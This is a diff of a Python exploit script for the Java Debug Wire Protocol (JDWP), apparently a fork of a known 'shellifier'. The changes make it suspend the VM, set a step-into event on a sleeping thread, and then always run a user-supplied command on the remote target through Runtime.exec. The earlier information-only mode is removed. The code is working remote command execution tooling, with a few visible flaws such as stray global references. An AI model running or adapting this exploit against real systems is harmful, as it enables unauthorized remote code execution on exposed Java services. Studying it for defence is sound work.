@@ -1,13 +1,3 @@
-#!/usr/bin/python
-################################################################################
-#
-# Universal JDWP shellifier
-#
-# @_hugsy_
-#
-# And special cheers to @lanjelot
-#
-
 import socket
 import time
 import sys
@@ -66,7 +56,10 @@ INVOKE_SINGLE_THREADED    = 2
 TAG_OBJECT                = 76
 TAG_STRING                = 115
 TYPE_CLASS                = 1
-
+MODKIND_STEP              = 10 
+EVENTKIND_STEP            = 1
+STEP_MIN                  = 0
+STEP_INTO                 = 0
 
 ################################################################################
 #
@@ -243,6 +236,14 @@ class JDWPClient:
                 return t
         return None
 
+    def get_name_by_threadId(self, threadId):
+        threadId = self.format(self.objectIDSize, threadId)
+        self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
+        buf = self.read_reply()
+        formats = [ ('S', "name") ]
+        buf = self.parse_entries(buf, formats, False)
+        return buf[0]['name']
+    
     def allclasses(self):
         try:
             getattr(self, "classes")
@@ -366,13 +367,17 @@ class JDWPClient:
         data = self.format(self.objectIDSize, threadId)
         self.socket.sendall( self.create_packet(kind, data=data) )
         buf = self.read_reply()
-        return
+        return buf
 
     def suspend_thread(self, threadId):
         return self.query_thread(threadId, THREADSUSPEND_SIG)
 
     def status_thread(self, threadId):
-        return self.query_thread(threadId, THREADSTATUS_SIG)
+        buf = self.query_thread(threadId, THREADSTATUS_SIG)
+        formats = [ ('I', "threadStatus"),
+                   ('I','suspendStatus')]
+        threadStatus = cli.parse_entries(buf, formats, False)
+        return threadStatus
 
     def resume_thread(self, threadId):
         return self.query_thread(threadId, THREADRESUME_SIG)
@@ -407,7 +412,7 @@ class JDWPClient:
         buf = self.read_reply()
         return buf
 
-    def parse_event_breakpoint(self, buf, eventId):
+    def parse_event(self, buf, eventId):
         num = struct.unpack(">I", buf[2:6])[0]
         rId = struct.unpack(">I", buf[6:10])[0]
         if rId != eventId:
@@ -416,11 +421,8 @@ class JDWPClient:
         loc = -1 # don't care
         return rId, tId, loc
 
-
-
-def runtime_exec(jdwp, args):
-    print ("[+] Targeting '%s:%d'" % (args.target, args.port))
-    print ("[+] Reading settings for '%s'" % jdwp.version)
+    
+def runtime_exec(jdwp):
 
     # 1. get Runtime class reference
     runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
@@ -437,123 +439,50 @@ def runtime_exec(jdwp, args):
         return False
     print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
 
-    # 3. setup breakpoint on frequently called method
-    c = jdwp.get_class_by_name( args.break_on_class )
-    if c is None:
-        print("[-] Could not access class '%s'" % args.break_on_class)
-        print("[-] It is possible that this class is not used by application")
-        print("[-] Test with another one with option `--break-on`")
-        return False
-
-    jdwp.get_methods( c["refTypeId"] )
-    m = jdwp.get_method_by_name( args.break_on_method )
-    if m is None:
-        print("[-] Could not access method '%s'" % args.break_on)
-        return False
-
-    loc = chr( TYPE_CLASS )
-    loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
-    loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
-    loc+= struct.pack(">II", 0, 0)
-    data = [ (MODKIND_LOCATIONONLY, loc), ]
-    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
-    print ("[+] Created break event id=%x" % rId)
+    # 3. setup 'step into' event
+    threads = jdwp.allthreads()
+    for thread in threads:
+        threadStatus = jdwp.status_thread(thread['threadId'])
+        threadStatus = threadStatus[0]["threadStatus"]
+        if threadStatus == 2: #Sleeping
+            threadId = thread['threadId']
+            break
+    if "threadId" not in dir():
+        print("Could not find a suitable thread for stepping")
+        exit()
+    
+    print("[+] Setting 'step into' event in thread: %s" % threadId)
+    jdwp.suspendvm()
+    step_info  = jdwp.format(jdwp.objectIDSize, threadId)
+    step_info += struct.pack(">I",STEP_MIN)
+    step_info += struct.pack(">I",STEP_INTO)
+    data       = [ (MODKIND_STEP, step_info), ]
+    
+    rId = jdwp.send_event(EVENTKIND_STEP, *data)
 
     # 4. resume vm and wait for event
     jdwp.resumevm()
 
-    print ("[+] Waiting for an event on '%s'" % args.break_on)
     while True:
         buf = jdwp.wait_for_event()
-        ret = jdwp.parse_event_breakpoint(buf, rId)
+        ret = jdwp.parse_event(buf, rId)
         if ret is not None:
             break
 
     rId, tId, loc = ret
     print ("[+] Received matching event from thread %#x" % tId)
 
-    jdwp.clear_event(EVENT_BREAKPOINT, rId)
+    jdwp.clear_event(EVENTKIND_STEP, rId)
 
     # 5. Now we can execute any code
-    if args.cmd:
-        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
-    else:
-        # by default, only prints out few system properties
-        runtime_exec_info(jdwp, tId)
+    runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
+
 
     jdwp.resumevm()
 
     print ("[!] Command successfully executed")
 
     return True
-
-
-def runtime_exec_info(jdwp, threadId):
-    #
-    # This function calls java.lang.System.getProperties() and
-    # displays OS properties (non-intrusive)
-    #
-    properties = {"java.version": "Java Runtime Environment version",
-                  "java.vendor": "Java Runtime Environment vendor",
-                  "java.vendor.url": "Java vendor URL",
-                  "java.home": "Java installation directory",
-                  "java.vm.specification.version": "Java Virtual Machine specification version",
-                  "java.vm.specification.vendor": "Java Virtual Machine specification vendor",
-                  "java.vm.specification.name": "Java Virtual Machine specification name",
-                  "java.vm.version": "Java Virtual Machine implementation version",
-                  "java.vm.vendor": "Java Virtual Machine implementation vendor",
-                  "java.vm.name": "Java Virtual Machine implementation name",
-                  "java.specification.version": "Java Runtime Environment specification version",
-                  "java.specification.vendor": "Java Runtime Environment specification vendor",
-                  "java.specification.name": "Java Runtime Environment specification name",
-                  "java.class.version": "Java class format version number",
-                  "java.class.path": "Java class path",
-                  "java.library.path": "List of paths to search when loading libraries",
-                  "java.io.tmpdir": "Default temp file path",
-                  "java.compiler": "Name of JIT compiler to use",
-                  "java.ext.dirs": "Path of extension directory or directories",
-                  "os.name": "Operating system name",
-                  "os.arch": "Operating system architecture",
-                  "os.version": "Operating system version",
-                  "file.separator": "File separator",
-                  "path.separator": "Path separator",
-                  "user.name": "User's account name",
-                  "user.home": "User's home directory",
-                  "user.dir": "User's current working directory"
-                }
-
-    systemClass = jdwp.get_class_by_name("Ljava/lang/System;")
-    if systemClass is None:
-        print ("[-] Cannot find class java.lang.System")
-        return False
-
-    jdwp.get_methods(systemClass["refTypeId"])
-    getPropertyMeth = jdwp.get_method_by_name("getProperty")
-    if getPropertyMeth is None:
-        print ("[-] Cannot find method System.getProperty()")
-        return False
-
-    for propStr, propDesc in properties.iteritems():
-        propObjIds =  jdwp.createstring(propStr)
-        if len(propObjIds) == 0:
-            print ("[-] Failed to allocate command")
-            return False
-        propObjId = propObjIds[0]["objId"]
-
-        data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, propObjId), ]
-        buf = jdwp.invokestatic(systemClass["refTypeId"],
-                                threadId,
-                                getPropertyMeth["methodId"],
-                                *data)
-        if buf[0] != chr(TAG_STRING):
-            print ("[-] %s: Unexpected returned type: expecting String" % propStr)
-        else:
-            retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
-            res = cli.solve_string(jdwp.format(jdwp.objectIDSize, retId))
-            print ("[+] Found %s '%s'" % (propDesc, res))
-
-    return True
-
 
 def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
     #
@@ -601,56 +530,25 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
 
     return True
 
-
-def str2fqclass(s):
-    i = s.rfind('.')
-    if i == -1:
-        print("Cannot parse path")
-        sys.exit(1)
-
-    method = s[i:][1:]
-    classname = 'L' + s[:i].replace('.', '/') + ';'
-    return classname, method
-
-
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
+    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @Lz1y, base on @_hugsy_",
                                      formatter_class=argparse.ArgumentDefaultsHelpFormatter )
 
     parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
     parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")
 
-    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
-                        default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
-    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
+    parser.add_argument("-c", "--cmd", dest="cmd", type=str, metavar="COMMAND",
                         help="Specify command to execute remotely")
 
     args = parser.parse_args()
-
-    classname, meth = str2fqclass(args.break_on)
-    setattr(args, "break_on_class", classname)
-    setattr(args, "break_on_method", meth)
-
-    retcode = 0
-
+    
+    cli = JDWPClient(args.target, args.port)
     try:
-        cli = JDWPClient(args.target, args.port)
         cli.start()
+    except:
+        print("Handshake failed!")
 
-        if runtime_exec(cli, args) == False:
-            print ("[-] Exploit failed")
-            retcode = 1
-
-    except KeyboardInterrupt:
-        print ("[+] Exiting on user's request")
-
-    except Exception as e:
-        print ("[-] Exception: %s" % e)
-        retcode = 1
-        cli = None
-
-    finally:
-        if cli:
-            cli.leave()
-
-    sys.exit(retcode)
+    #print vm description
+    print "[+] Dump vm description \n", cli.description, "\n"
+    runtime_exec(cli)
+    cli.leave()
